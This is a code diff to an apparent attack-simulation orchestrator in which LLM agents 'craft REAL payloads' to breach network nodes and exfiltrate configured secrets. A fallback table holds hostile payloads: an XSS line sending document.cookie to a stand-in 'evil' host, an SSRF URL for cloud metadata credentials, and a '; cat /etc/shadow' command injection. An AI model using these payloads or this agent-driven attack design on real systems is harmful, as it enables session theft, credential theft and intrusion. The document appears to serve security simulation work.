@@ -293,6 +293,13 @@ export class SwarmOrchestrator {
     else if (resp.response) loot = String(resp.response);
     else loot = v.evidence || null;
 
+    // If the breached scenario node has its OWN configured secret (a user-built
+    // network), that's the real prize — surface it as the stolen secret so a
+    // custom network steals ITS data, not the default acme secrets.
+    const node = this.scenario.nodes.find(n => n.label === this._nodeForVector(v.type));
+    const nodeSecret = node?.secretValue || null;
+    if (nodeSecret) loot = nodeSecret;
+
     return {
       method: 'POST',
       endpoint: v.endpoint || target?.endpoint,
@@ -301,6 +308,8 @@ export class SwarmOrchestrator {
       status: target?.simulated ? 'SIM' : (resp.blocked ? 403 : 200),
       leaked: Boolean(resp.leaked || resp.vulnerable || v.exploitable),
       loot: loot ? String(loot).slice(0, 280) : null,
+      secretName: node?.secret || resp.secretName || null,
+      nodeLabel: node?.label || null,
     };
   }
 
@@ -310,7 +319,7 @@ export class SwarmOrchestrator {
    * matching strength; difficulty just shapes the evidence text. Deterministic
    * by design so a given network scores consistently.
    */
-  _simulateAttack(vector) {
+  async _simulateAttack(vector, agent) {
     const w = this.weaknesses.find(x => x.vector === vector);
     if (!w || w.neutralized) {
       return { success: false, blockedByDefense: w?.neutralized || false,
@@ -318,25 +327,53 @@ export class SwarmOrchestrator {
                message: w ? 'neutralized by node strength' : 'no such weakness on this network' };
     }
     const node = this.scenario.nodes.find(n => n.label === w.nodeLabel);
+
+    // The attacking agent's LLM crafts a REAL payload for this vector — even on
+    // a user-built node, the agent genuinely generates the attack (not a canned
+    // placeholder). Falls back to a representative payload if the call fails.
+    let payload = null;
+    if (agent && typeof agent.craftPayload === 'function') {
+      payload = await agent.craftPayload(vector, null).catch(() => null);
+    }
+    payload = payload || this._fallbackSimPayload(vector);
+
     const evidenceByVector = {
       XSS: 'reflected payload executed in victim browser context',
       SSRF: 'server fetched attacker-controlled internal URL (169.254.169.254)',
-      IDOR: 'accessed another tenant\'s object by id enumeration',
+      IDOR: "accessed another tenant's object by id enumeration",
       RCE: 'achieved code execution via unsandboxed eval',
       AUTH_BYPASS: 'forged session / skipped auth check',
     };
+
+    // The ACTUAL secret this node holds is exfiltrated — the real value the user
+    // configured (or one generated for it), not just the label.
+    const stolen = node?.secretValue || node?.secret || null;
     const vulnerability = {
       type: vector,
-      endpoint: `/sim/${vector}`,
-      payload: `«${vector.toLowerCase()} exploit»`,
-      crafted: false,
+      endpoint: `${node?.label || 'node'} (${node?.ip || 'sim'})`,
+      payload,
+      crafted: Boolean(payload && payload !== this._fallbackSimPayload(vector)),
       severity: (node?.difficulty || 1) >= 3 ? 'CRITICAL' : 'HIGH',
       exploitable: true,
       simulated: true,
-      evidence: evidenceByVector[vector] || 'sensitive operation performed',
-      details: node?.secret ? { secret: node.secret } : undefined,
+      evidence: stolen ? `exfiltrated ${node.secret || 'secret'}: ${stolen}` : (evidenceByVector[vector] || 'sensitive operation performed'),
+      details: stolen ? { secret: stolen, secretName: node.secret } : undefined,
     };
-    return { success: true, vulnerability, payload: vulnerability.payload, response: { simulated: true, leaked: true } };
+    return {
+      success: true, vulnerability, payload,
+      // Shape the response like a real endpoint so loot/exchange extraction works.
+      response: { simulated: true, leaked: true, secret: stolen, secretName: node?.secret, node: node?.label },
+    };
+  }
+
+  _fallbackSimPayload(vector) {
+    return {
+      XSS: '<script>fetch("//evil/?c="+document.cookie)</script>',
+      SSRF: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+      IDOR: 'GET /api/account/1001  (then 1002, 1003…)',
+      RCE: '; cat /etc/shadow #',
+      AUTH_BYPASS: 'admin=true; role=superuser',
+    }[vector] || `${vector.toLowerCase()} exploit`;
   }
 
   /**
@@ -372,7 +409,7 @@ export class SwarmOrchestrator {
         // the scenario node's weakness/strength tags + a difficulty roll.
         const target = this._resolveTarget(attackType, plan.target);
         const result = target?.simulated
-          ? this._simulateAttack(attackType)
+          ? await this._simulateAttack(attackType, agent)
           : await agent.executeAttack(target, attackType);
 
         this.stats.attacksAttempted++;
